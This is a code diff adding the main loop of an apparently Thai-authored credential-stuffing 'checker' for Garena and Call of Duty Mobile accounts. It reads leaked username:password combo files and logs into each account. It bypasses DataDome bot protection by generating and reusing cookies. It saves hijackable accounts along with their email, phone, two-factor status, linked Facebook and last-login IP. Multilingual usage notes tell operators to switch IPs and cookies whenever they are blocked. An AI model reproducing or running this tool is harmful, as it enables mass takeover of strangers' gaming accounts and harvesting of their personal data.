+            logger.error(f"[ERROR] Unable to save ROV early: {e}")
+
+        # ============================================
+        # CODM Checker
+        # ============================================
+        has_codm, codm_info = check_codm_account(session, account)
+
+        fresh_datadome = datadome_manager.extract_datadome_from_session(session)
+        if fresh_datadome:
+            cookie_manager.save_cookie(fresh_datadome)
+
+        if has_codm:
+            save_account_details(account, details, codm_info, password, game_connections)
+            logger.info(f"[SUCCESS] Saved CODM data for {account}")
+        else:
+            logger.info(f"[INFO] No CODM found for {account}")
+
+        # Update Stats
+        live_stats.update_stats(
+            valid=True,
+            clean=details['is_clean'],
+            has_codm=has_codm,
+            has_rov=len(rov_list) > 0,
+            rov_clean=(email_verified_display == "NO" and mobile_bound == "NO")
+        )
+
+        # ============================================
+        # ส่งผลลัพธ์กลับ (SUCCESS)
+        # ============================================
+        checked_accounts.add(f"{account}:{password}")   # 🟩 SUCCESS → ลบ
+        return format_account_output({
+            "status": "success",
+            "username": account,
+            "password": password,
+            "shell": details["profile"]["shell_balance"],
+            "email": details["email"],
+            "mobile": details["personal"]["mobile_no"],
+            "country": details["personal"]["country"],
+            "email_verified": "TRUE" if details["email_verified"] else "FALSE",
+            "two_step_verify": "TRUE" if details["security"]["two_step_verify"] else "FALSE",
+            "authenticator": "TRUE" if details["security"]["authenticator_app"] else "FALSE",
+            "last_login_source": details.get("last_login_source", "N/A"),
+            "last_login_ip": details.get("last_login_ip", "N/A"),
+            "last_login_country": details.get("last_login_country", "N/A"),
+            "last_login_date": details.get("last_login_date", datetime.now().strftime("%Y-%m-%d %H:%M:%S")),
+            "avatar": details.get("avatar", "N/A"),
+            "account_status": details["status"]["account_status"],
+            "facebook": {
+                "fb_uid": details["security"].get("fb_uid", "Not Set"),
+                "fb_username": details["security"].get("fb_username", "N/A")
+            },
+            "security_data": {
+                "facebook_connected": details["security"]["facebook_connected"]
+            },
+            "codm_info": codm_info if has_codm else {},
+            "game_connections": game_connections
+        })
+
+    except Exception as e:
+        logger.error(f"[ERROR] Unexpected error processing {account}: {e}")
+        import traceback
+        logger.error(traceback.format_exc())
+
+        live_stats.update_stats(valid=False)
+
+        return format_account_output({
+            "status": "error",
+            "username": account,
+            "password": password,
+            "type": "Processing Error",
+            "message": str(e)
+        })
+
+
+
+def find_nearest_account_file():
+    keywords = ["garena", "account", "codm"]
+    combo_folder = os.path.join(os.path.dirname(os.path.abspath(__file__)), "Combo")
+
+    txt_files = []
+    for root, _, files in os.walk(combo_folder):
+        for file in files:
+            if file.endswith(".txt"):
+                txt_files.append(os.path.join(root, file))
+
+    for file_path in txt_files:
+        if any(keyword in os.path.basename(file_path).lower() for keyword in keywords):
+            return file_path
+
+    if txt_files:
+        return random.choice(txt_files)
+
+    return os.path.join(combo_folder, "accounts.txt")
+
+def remove_duplicates_from_file(file_path):
+    try:
+        with open(file_path, 'r', encoding='utf-8') as f:
+            lines = f.readlines()
+
+        unique_lines = []
+        seen_lines = set()
+        for line in lines:
+            stripped_line = line.strip()
+            if stripped_line and stripped_line not in seen_lines:
+                unique_lines.append(line)
+                seen_lines.add(stripped_line)
+
+        if len(lines) == len(unique_lines):
+            console.print(f"[yellow][*] ไม่พบบรรทัดซ้ำใน {os.path.basename(file_path)}.[/yellow]")
+            return False
+
+        with open(file_path, 'w', encoding='utf-8') as f:
+            f.writelines(unique_lines)
+
+        console.print(f"[green][+] ลบสำเร็จแล้ว {len(lines) - len(unique_lines)} duplicate lines from {os.path.basename(file_path)}.[/green]")
+        return True
+    except FileNotFoundError:
+        console.print(f"[red][ERROR] File not found: {file_path}[/red]")
+        return False
+    except Exception as e:
+        console.print(f"[red][ERROR] Failed to remove duplicates from {os.path.basename(file_path)}: {e}[/red]")
+        return False
+
+def select_input_file():
+    script_dir = os.path.dirname(os.path.abspath(__file__))
+    combo_folder = os.path.join(script_dir, "Combo")
+
+    translations_dict = {
+        "tagalog": {
+            "instructions": [
+                "[!] MAGBASA KA PARA MAIWASAN ANG PAG TANONG!",
+                "[*] AUTO GEN COOKIES NA YAN PAG NAGAMIT ANG STARTER COOKIES(cookies.txt)!",
+                "[*] SA COOKIE FOLDER KA KUMUHA NG FRESH COOKIES!",
+                "[*] KAPAG NAG IP BLOCKED NA, MAGPALIT KA NG IP AT COOKIES!",
+                "[*] KUNG IP BLOCKED 2-3 TIMES NA SUNUD-SUNOD, JUMP KA BAWAT 200 COOKIE SETS!"
+            ],
+            "restart_message": "[!] RESTART MO CHECKER AT LAGYAN MO NG TXT YUNG COMBO FOLDER!"
+        },
+
+        "english": {
+            "instructions": [
+                "[!] READ THIS TO AVOID ASKING QUESTIONS!",
+                "[*] DataDome ARE AUTO-GENERATED !",
+                "[*] IF IP IS BLOCKED, CHANGE YOUR IP!",
+                "[*] AI & TAWINSHOT Garena"
+            ],
+            "restart_message": "[!] RESTART THE CHECKER AND ADD YOUR TXT FILES TO THE COMBO FOLDER!"
+        },
+
+        "thai": {
+            "instructions": [
+                "[!] กรุณาอ่านก่อนใช้งาน เพื่อลดปัญหาและคำถามซ้ำ!",
+                "[*] DataDome จะถูกสร้างให้อัตโนมัติเมื่อใช้งานโปรแกรม!",
+                "[*] หาก IP ถูกบล็อก ให้เปลี่ยน IP ทันที!",
+                "[*] AI & TAWINSHOT Garena"
+            ],
+            "restart_message": "[!] กรุณารีสตาร์ทโปรแกรม และนำไฟล์ .txt ของคุณใส่ไว้ในโฟลเดอร์ Combo!"
+        },
+
+        "indonesian": {
+            "instructions": [
+                "[!] BACA INI UNTUK MENGHINDARI PERTANYAAN!",
+                "[*] COOKIE AKAN OTOMATIS DIGENERASI SETELAH MENGGUNAKAN STARTER COOKIES (cookies.txt)!",
+                "[*] AMBIL COOKIE BARU DARI FOLDER COOKIE!",
+                "[*] JIKA IP DIBLOKIR, GANTI IP DAN COOKIE ANDA!",
+                "[*] JIKA IP DIBLOKIR 2-3 KALI BERTURUT-TURUT, LOMPAT SETIAP 200 SET COOKIE!"
+            ],
+            "restart_message": "[!] MULAI ULANG CHECKER DAN TAMBAHKAN FILE TXT KE FOLDER COMBO!"
+        }
+    }
+
+    # ► แสดงหน้าเลือกภาษา
+    show_instructions = console.input("[yellow][?] ต้องการดูคำแนะนำก่อนใช้งานหรือไม่? (y/n): [/yellow]").strip().lower()
+
+    selected_language = "thai"   # ตั้งค่าเริ่มต้นเป็นภาษาไทย
+
+    if show_instructions == 'y':
+        console.print("[cyan][*] เลือกภาษา: 1. Tagalog, 2. English, 3. Indonesian, 4. Thai[/cyan]")
+        language_choice = console.input("[yellow][?] เลือกภาษา (1-4, ค่าเริ่มต้น 4 ภาษาไทย): [/yellow]").strip()
+
+        language_map = {"1": "tagalog", "2": "english", "3": "indonesian", "4": "thai"}
+        selected_language = language_map.get(language_choice, "thai")
+
+        instructions = translations_dict[selected_language]["instructions"]
+
+        max_length = max(len(instruction) for instruction in instructions) + 4
+        border_width = max_length + 4
+
+        console.print(f"[cyan]╔{'═' * (border_width - 2)}╗[/cyan]")
+        console.print(f"[cyan]║{' คำแนะนำการใช้งาน ':^{border_width - 2}}║[/cyan]")
+        console.print(f"[cyan]╠{'═' * (border_width - 2)}╣[/cyan]")
+
+        for instruction in instructions:
+            color = "yellow" if "IP" in instruction else "red"
+            console.print(f"[cyan]║[/cyan] [{color}]{instruction:<{border_width - 4}}[/{color}] [cyan]║[/cyan]")
+
+        console.print(f"[cyan]╚{'═' * (border_width - 2)}╝[/cyan]")
+        console.print()
+
+    # ► สร้างโฟลเดอร์ Combo หากยังไม่มี
+    if not os.path.exists(combo_folder):
+        os.makedirs(combo_folder, exist_ok=True)
+        console.print(f"[green][!] สร้างโฟลเดอร์ Combo เรียบร้อยแล้ว[/green]")
+        console.print(f"[yellow]{translations_dict[selected_language]['restart_message']}[/yellow]")
+        exit(0)
+
+    # ► ค้นหาไฟล์ .txt
+    txt_files = [f for f in os.listdir(combo_folder) if f.endswith('.txt')]
+    file_path = None
+
+    if txt_files:
+        console.print(f"[green][+] พบไฟล์ .txt จำนวน {len(txt_files)} ไฟล์ในโฟลเดอร์ Combo:[/green]")
+
+        max_filename_length = max(len(f"{i}. {file}") for i, file in enumerate(txt_files, 1)) + 2
+        max_size_length = 9
+        max_line_count_length = max(
+            len(f"{sum(1 for line in open(os.path.join(combo_folder, file), 'r', encoding='utf-8') if line.strip()):,}")
+            for file in txt_files) + 2
+
+        top_border = f"[cyan]╔{'═' * (max_filename_length + 2)}╦{'═' * (max_size_length + 2)}╦{'═' * (max_line_count_length + 2)}╗[/cyan]"
+        header_border = f"[cyan]╠{'═' * (max_filename_length + 2)}╬{'═' * (max_size_length + 2)}╬{'═' * (max_line_count_length + 2)}╣[/cyan]"
+        bottom_border = f"[cyan]╚{'═' * (max_filename_length + 2)}╩{'═' * (max_size_length + 2)}╩{'═' * (max_line_count_length + 2)}╝[/cyan]"
+
+        # ► ตารางข้อมูลไฟล์
+        console.print(top_border)
+        console.print(
+            f"[cyan]║ [white]{'ชื่อไฟล์':^{max_filename_length}} [cyan]║ [white]{'ขนาด':^{max_size_length}} [cyan]║ [white]{'จำนวนบรรทัด':^{max_line_count_length}} [cyan]║[/cyan]")
+        console.print(header_border)
+
+        for i, file in enumerate(txt_files, 1):
+            file_path_full = os.path.join(combo_folder, file)
+            file_size = os.path.getsize(file_path_full) / 1024
+
+            try:
+                with open(file_path_full, 'r', encoding='utf-8') as f:
+                    line_count = sum(1 for line in f if line.strip())
+            except Exception as e:
+                line_count = 0
+                console.print(f"[yellow][WARNING] ไม่สามารถอ่านจำนวนบรรทัดจาก {file}: {e}[/yellow]")
+
+            size_display = f"{file_size/1024:.1f}MB" if file_size >= 1000 else f"{file_size:.2f}KB"
+            line_count_display = f"{line_count:,}"
+            filename_display = f"{i}. {file}"
+
+            console.print(
+                f"[cyan]║ [yellow]{filename_display:<{max_filename_length}} [cyan]║ [yellow]{size_display:>{max_size_length}} [cyan]║ [yellow]{line_count_display:>{max_line_count_length}} [cyan]║[/cyan]"
+            )
+
+        console.print(bottom_border)
+
+        # ► เลือกไฟล์
+        while True:
+            try:
+                choice = console.input(f"[yellow][?] เลือกไฟล์ (1-{len(txt_files)}) หรือกด Enter เพื่อค้นหาไฟล์อัตโนมัติ: [/yellow]").strip()
+                if not choice:
+                    file_path = find_nearest_account_file()
+                    break
+                choice_idx = int(choice) - 1
+                if 0 <= choice_idx < len(txt_files):
+                    file_path = os.path.join(combo_folder, txt_files[choice_idx])
+                    break
+                else:
+                    console.print(f"[red][!] เลือกตัวเลขไม่ถูกต้อง โปรดลองใหม่[/red]")
+            except ValueError:
+                console.print(f"[red][!] กรุณาใส่หมายเลข หรือกด Enter[/red]")
+
+    else:
+        console.print(f"[yellow][!] ไม่พบไฟล์ .txt ในโฟลเดอร์ Combo[/yellow]")
+        file_path = console.input("ป้อนที่อยู่ไฟล์ .txt หรือกด Enter เพื่อค้นหาไฟล์อัตโนมัติ: ").strip()
+        if not file_path:
+            file_path = find_nearest_account_file()
+
+    # ► ถ้าพบไฟล์ → ถามว่าจะลบบรรทัดซ้ำไหม
+    if os.path.exists(file_path):
+        remove_duplicates_choice = console.input(
+            f"[yellow][?] ต้องการลบบรรทัดซ้ำจากไฟล์ {os.path.basename(file_path)} หรือไม่? (y/n): [/yellow]"
+        ).strip().lower()
+        if remove_duplicates_choice == 'y':
+            remove_duplicates_from_file(file_path)
+
+
+# ► คำถามใหม่: ต้องการลบ "บัญชีที่เข้าได้แล้ว" ออกจากไฟล์หรือไม่
+        remove_valid_choice = console.input(
+            f"[yellow][?] คุณต้องการลบรหัสที่เข้าแล้วออกจากไฟล์ {os.path.basename(file_path)} หรือไม่? (y/n): [/yellow]"
+        ).strip().lower()
+
+        if remove_valid_choice == 'y':
+            try:
+                cleaned_lines = []
+                with open(file_path, 'r', encoding='utf-8') as f:
+                    for line in f:
+                        acc = line.strip()
+                        # เงื่อนไขนี้ใช้ลบไอดีที่เคยเข้าแล้ว (VALID)
+                        if acc not in checked_accounts:
+                            cleaned_lines.append(line)
+
+        
+                with open(file_path, 'w', encoding='utf-8') as f:
+                    f.writelines(cleaned_lines)
+        
+                console.print(f"[green][✔] ลบไอดีที่เข้าได้แล้วออกจากไฟล์เรียบร้อย: {os.path.basename(file_path)}[/green]")
+
+            except Exception as e:
+                console.print(f"[red][!] ไม่สามารถลบไอดีที่เข้าแล้วได้: {e}[/red]")
+
+    return file_path
+
+def remove_checked_accounts_from_file(file_path):
+    try:
+        global checked_accounts
+
+        cleaned_lines = []
+        with open(file_path, 'r', encoding='utf-8') as f:
+            for line in f:
+                acc = line.strip()
+                if acc not in checked_accounts:
+                    cleaned_lines.append(line)
+
+        with open(file_path, 'w', encoding='utf-8') as f:
+            f.writelines(cleaned_lines)
+
+        console.print(f"[green][✔] ลบไอดีที่เคยเช็คแล้วออกจากไฟล์เรียบร้อยทั้งหมด[/green]")
+
+    except Exception as e:
+        console.print(f"[red][!] ลบไอดีที่เคยเช็คแล้วไม่สำเร็จ: {e}[/red]")
+
+
+def main():
+    
+    filename = select_input_file()
+    
+    if not os.path.exists(filename):
+        logger.error(f"[ERROR] File '{filename}' not found.")
+        return
+    
+    cookie_manager = CookieManager()
+    datadome_manager = DataDomeManager()
+    live_stats = LiveStats()
+    
+    session = cloudscraper.create_scraper()
+    
+    initial_cookie = cookie_manager.get_valid_cookie()
+    if initial_cookie:
+        logger.info(f"[𝙄𝙉𝙁𝙊] Using saved cookie")
+        applyck(session, initial_cookie)
+    else:
+        logger.info(f"[𝙄𝙉𝙁𝙊] No saved cookies found. Starting fresh session.")
+        
+        datadome = get_datadome_cookie(session)
+        if datadome:
+            datadome_manager.set_datadome(datadome)
+            logger.info(f"[𝙄𝙉𝙁𝙊] Generated initial DataDome cookie")
+    
+    accounts = []
+    encodings_to_try = ['utf-8', 'latin-1', 'cp1252', 'iso-8859-1']
+    
+    for encoding in encodings_to_try:
+        try:
+            with open(filename, 'r', encoding=encoding) as file:
+                accounts = [line.strip() for line in file if line.strip()]
+            logger.info(f"[SUCCESS] File loaded with {encoding} encoding")
+            break
+        except UnicodeDecodeError:
+            logger.warning(f"[WARNING] Failed to read with {encoding} encoding, trying next...")
+            continue
+        except Exception as e:
+            logger.error(f"[ERROR] Error reading file with {encoding}: {e}")
+            continue
+    
+    if not accounts:
+        try:
+            logger.info(f"[INFO] Trying with error handling...")
+            with open(filename, 'r', encoding='utf-8', errors='ignore') as file:
+                accounts = [line.strip() for line in file if line.strip()]
+            logger.info(f"[SUCCESS] File loaded with error handling")
+        except Exception as e:
+            logger.error(f"[ERROR] Could not read file with any encoding: {e}")
+            return
+    
+    if not accounts:
+        logger.error(f"[ERROR] No accounts found in file '{filename}'")
+        return
+    
+    logger.info(f"[𝙄𝙉𝙁𝙊] Total accounts to process: {len(accounts)}")
+    
+    for i, account_line in enumerate(accounts, 1):
+        if ':' not in account_line:
+            logger.warning(f"[WARNING] Skipping invalid account line: {account_line}")
+            continue
+        try:
+            account, password = account_line.split(':', 1)
+            account = account.strip()
+            password = password.strip()
+            
+            logger.debug(f"[𝙄𝙉𝙁𝙊] Processing {i}/{len(accounts)}: {account}... ")
+            
+            
+            formatted_output = processaccount(session, account, password, cookie_manager, datadome_manager, live_stats)
+            
+            
+            print(formatted_output, flush=True)
+            
+            
+            print(f"{live_stats.display_stats()}\n", flush=True)
+            
+        except Exception as e:
+            logger.error(f"[ERROR] Error processing account line {i}: {e}")
+            
+            error_result = {
+                "status": "error",
+                "username": account_line.split(':')[0] if ':' in account_line else account_line,
+                "password": account_line.split(':')[1] if ':' in account_line else "N/A",
+                "type": "Processing Error",
+                "message": str(e)
+            }
+            formatted_error = format_account_output(error_result)
+            print(formatted_error, flush=True)
+            continue
+    remove_checked_accounts_from_file(filename)
+    
+    final_stats = live_stats.get_stats()
+    print("\n" + "="*80)
+    logger.info(f"[FINAL STATS] VALID: {final_stats['valid']} | INVALID: {final_stats['invalid']} | CLEAN: {final_stats['clean']} | NOT CLEAN: {final_stats['not_clean']} | HAS CODM: {final_stats['has_codm']} | NO CODM: {final_stats['no_codm']} -> config TawinShop")
+    print("="*80)
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        logger.info(f"[INFO] Script terminated by user")
+    except Exception as e:
+        logger.error(f"[ERROR] Unexpected error in main: {e}")
